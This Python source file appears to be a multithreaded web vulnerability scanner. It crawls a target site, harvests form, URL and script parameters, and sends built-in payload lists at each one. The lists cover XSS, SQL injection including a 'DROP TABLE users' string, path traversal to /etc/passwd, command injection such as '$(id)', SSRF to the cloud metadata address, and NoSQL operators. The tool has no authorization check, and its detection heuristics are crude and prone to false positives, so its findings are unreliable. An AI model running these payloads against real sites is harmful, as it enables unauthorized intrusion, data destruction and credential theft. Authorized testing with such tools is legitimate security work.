import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin, parse_qs
import concurrent.futures
import threading
from queue import Queue
import re

class VulnerabilityScanner:
    def __init__(self):
        self.target_url = ""
        self.found_vulnerabilities = Queue()
        self.session = requests.Session()
        self.visited_urls = set()
        self.lock = threading.Lock()
        
        # Comprehensive payload lists
        self.payloads = {
            'xss': [
                '<script>alert("XSS")</script>',
                '"><script>alert("XSS")</script>',
                '<img src=x onerror=alert("XSS")>',
                '">><marquee><img src=x onerror=alert("XSS")></marquee>",',
                '<svg/onload=alert("XSS")>',
                '<body onload=alert("XSS")>',
            ],
            'sql': [
                "' OR '1'='1",
                "admin' --",
                "' UNION SELECT NULL--",
                "') OR ('1'='1",
                "1; DROP TABLE users",
                "1' AND '1'='1",
                "' OR 1=1#",
                "' OR 'x'='x",
            ],
            'lfi': [
                '../../../../etc/passwd',
                '../../windows/win.ini',
                '/etc/passwd',
                'C:\\Windows\\system.ini',
                '/proc/self/environ',
                '/var/log/apache/access.log',
            ],
            'rce': [
                ';ls',
                '|ls',
                '`ls`',
                ';id',
                '|id',
                '`id`',
                '$(id)',
            ],
            'ssrf': [
                'http://localhost',
                'http://127.0.0.1',
                'http://169.254.169.254',
                'http://0.0.0.0',
            ],
            'nosql': [
                '{"$gt": ""}',
                '{"$ne": null}',
                '{"$where": "1==1"}',
                '{"$regex": ".*"}',
            ]
        }

    def check_vulnerability(self, url, param, payload_type, payload):
        try:
            test_url = f"{url}?{param}={payload}"
            response = requests.get(test_url, timeout=5)
            
            # Vulnerability indicators
            indicators = {
                'xss': lambda r: payload in r.text,
                'sql': lambda r: any(x in r.text.lower() for x in ['sql', 'mysql', 'oracle', 'syntax']),
                'lfi': lambda r: any(x in r.text.lower() for x in ['root:', 'win.ini', '[extension]']),
                'rce': lambda r: any(x in r.text.lower() for x in ['uid=', 'root:', 'directory listing']),
                'ssrf': lambda r: len(r.text) > 0 and r.status_code == 200,
                'nosql': lambda r: 'mongodb' in r.text.lower() or r.status_code == 500
            }

            if indicators[payload_type](response):
                self.found_vulnerabilities.put({
                    'type': payload_type.upper(),
                    'url': test_url,
                    'parameter': param,
                    'payload': payload
                })

        except requests.RequestException:
            pass

    def scan_endpoint(self, url, params):
        with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
            futures = []
            for param in params:
                for vuln_type, payloads in self.payloads.items():
                    for payload in payloads:
                        futures.append(
                            executor.submit(
                                self.check_vulnerability,
                                url,
                                param,
                                vuln_type,
                                payload
                            )
                        )
            concurrent.futures.wait(futures)

    def extract_parameters(self, url, html):
        params = set()
        
        # URL parameters
        if '?' in url:
            params.update(parse_qs(url.split('?')[1]).keys())
        
        # Form parameters
        soup = BeautifulSoup(html, 'html.parser')
        for form in soup.find_all('form'):
            for input_field in form.find_all(['input', 'textarea']):
                if input_field.get('name'):
                    params.add(input_field.get('name'))
                    
        # JavaScript parameters
        scripts = soup.find_all('script')
        for script in scripts:
            if script.string:
                param_matches = re.findall(r'["\'](\w+)["\']:\s*["\']?\w+["\']?', script.string)
                params.update(param_matches)
                
        return list(params)

    def crawl_site(self, url):
        if url in self.visited_urls:
            return []
        
        with self.lock:
            self.visited_urls.add(url)
        
        try:
            response = requests.get(url)
            soup = BeautifulSoup(response.text, 'html.parser')
            params = self.extract_parameters(url, response.text)
            
            if params:
                self.scan_endpoint(url, params)
            
            # Find and queue additional URLs
            with concurrent.futures.ThreadPoolExecutor(max_workers=5) as executor:
                futures = []
                for link in soup.find_all('a'):
                    href = link.get('href')
                    if href:
                        full_url = urljoin(url, href)
                        if full_url.startswith(self.target_url) and full_url not in self.visited_urls:
                            futures.append(executor.submit(self.crawl_site, full_url))
                concurrent.futures.wait(futures)
                
        except requests.RequestException:
            pass

    def start_scan(self, url):
        self.target_url = url
        self.visited_urls.clear()
        while not self.found_vulnerabilities.empty():
            self.found_vulnerabilities.get()
            
        # Start crawling with multiple threads
        with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
            executor.submit(self.crawl_site, url)
            
        # Collect results
        vulnerabilities = []
        while not self.found_vulnerabilities.empty():
            vulnerabilities.append(self.found_vulnerabilities.get())
            
        return vulnerabilities
